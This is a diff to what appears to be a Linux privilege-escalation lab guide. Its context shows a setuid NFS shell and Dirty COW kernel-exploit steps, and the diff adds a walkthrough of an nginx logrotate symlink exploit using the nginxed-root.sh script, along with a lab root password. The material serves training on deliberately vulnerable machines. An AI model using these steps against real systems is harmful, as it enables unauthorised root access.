@@ -560,8 +560,6 @@ chmod +xs /tmp/nfs/shell.elf
 
 ## Kernel Exploits
 
-
-
 Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
 
 1. Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
@@ -591,3 +589,34 @@ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 mv /tmp/bak /usr/bin/passwd
 exit
 ```
+
+## SUID (Symlinks) 
+
+Detection
+
+Linux VM
+
+1. In command prompt type: dpkg -l | grep nginx
+2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
+
+Exploitation
+
+Linux VM – Terminal 1
+
+1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
+2. The root password is password123
+3. Once escalated to root, in command prompt type: su -l www-data
+4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
+5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.
+
+Linux VM – Terminal 2
+
+1. Once logged in, type: su root
+2. The root password is password123
+3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
+4. Switch back to the previous terminal.
+
+Linux VM – Terminal 1
+
+1. From the output, notice that the exploit continued its execution.
+2. In command prompt type: id
